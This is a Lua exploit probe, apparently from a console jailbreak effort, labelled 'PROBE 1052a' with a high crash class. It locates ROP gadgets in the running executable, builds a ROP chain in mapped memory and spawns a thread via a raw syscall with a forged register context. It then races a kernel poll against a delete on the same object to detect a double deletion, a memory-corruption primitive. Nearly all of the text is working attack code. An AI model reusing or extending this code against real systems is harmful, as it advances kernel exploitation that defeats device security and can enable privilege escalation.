-- CRASH_CLASS: HIGH
-- PROBE 1052a: delete racing the poll that makes it legal
-- 1051a: three deleters, six trials, exactly one success each - delete-vs-delete is clean.
-- The 14.20 note says the delete drops the lock when the object is in flight.  Poll is the
-- only path that moves the object between states, so race the poll against the delete and
-- watch for two successes on one id.
print("=== PROBE 1052a: poll vs delete race ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end
local function mmap(px) return to_num(select(2, pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end))) end
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off; if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local fn = to_num(syscall.pipe.fn_addr)
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E, 0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A, 0xC3))
local store = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] eboot=%08X gadgets ok=%s", ebase, tostring(pop_rax and pop_rdi and pop_rsi and pop_rdx and store and jmp_g)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and store and jmp_g) then print("[!] gadget missing"); return end

local D = mmap(0x4000)
local ID = mmap(0x4000)
local PO = mmap(0x4000)
local ST = mmap(0x8000)     -- 0x000 parent delete, 0x1000 child poll, 0x2000 child delete, 0x1800/0x2800 markers
local blk = mmap(0x40000)
local ts = mmap(0x1000)
print(string.format("[A] D=%08X ID=%08X ST=%08X blk=%08X", D, ID, ST, blk))
if D == 0 or ID == 0 or ST == 0 or blk == 0 then print("[!] mmap failed"); return end
local sc669, sc662, sc664, sc430 = mk(669), mk(662), mk(664), mk(430)
local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100, RAX = 0x078 }

-- child chain: 664(PO,1,ST+0x1000) then 662(ID,1,ST+0x2000) then mark and exit
local start = blk + 0x4000
local i = 0
local function put(v) wq(start + 8 + i * 8, uint64(v)); i = i + 1 end
put(pop_rdi); put(PO); put(pop_rsi); put(1); put(pop_rdx); put(ST + 0x1000); put(pop_rax); put(664); put(fn)
put(pop_rdi); put(ID); put(pop_rsi); put(1); put(pop_rdx); put(ST + 0x2000); put(pop_rax); put(662); put(fn)
put(pop_rax); put(20); put(fn)
put(pop_rdi); put(ST + 0x2800); put(store)
put(pop_rdi); put(0); put(pop_rax); put(431); put(fn); put(jmp_g)
local function spawn()
    local ctx = memory.alloc(0x500); zero(ctx, 0x500)
    wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
    wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
    wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start + 8)); wq(ctx + Ctx.RAX, uint64(20))
    local tb = memory.alloc(8); wq(tb, uint64(0))
    local ok, rv = pcall(function() return sc430(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end
local function sleep_us(us) wq(ts, uint64(0)); wq(ts + 8, uint64(us * 1000)); pcall(function() return mk(240)(uint64(ts), uint64(0)) end) end
local function create()
    wd(D + 0x00, 0); wd(D + 0x08, 0); wd(D + 0x10, 0); wd(D + 0x18, 0); wd(D + 0x20, -1); wd(D + 0x24, 0)
    wd(ID, 0)
    pcall(function() return sc669(uint64(0x1001), uint64(D), uint64(1), uint64(1), uint64(ID)) end)
    return rd(ID) or 0
end

local TRIALS = 8
local doubles = 0
for t = 1, TRIALS do
    local id = create()
    if id == 0 then print(string.format("[T%d] create failed", t)) break end
    wq(PO, uint64(id))
    wd(ST, 0); wd(ST + 0x1000, 0); wd(ST + 0x2000, 0); wd(ST + 0x2800, 0)
    local oks = spawn()
    local okP = pcall(function() return sc662(uint64(ID), uint64(1), uint64(ST)) end)
    sleep_us(120000)
    local sp = rd(ST) or 0
    local pl = rd(ST + 0x1000) or 0
    local cd = rd(ST + 0x2000) or 0
    local succ = 0
    if sp == 0 then succ = succ + 1 end
    if cd == 0 then succ = succ + 1 end
    if succ > 1 then doubles = doubles + 1 end
    print(string.format("[T%d] id=%08X spawn=%s parent_del=%08X child_poll=%08X child_del=%08X succ=%d%s",
        t, id, tostring(oks), sp, pl, cd, succ, succ > 1 and "  <- DOUBLE" or ""))
end
print(string.format("[Z] trials=%d doubles=%d alive pid=%d", TRIALS, doubles, to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
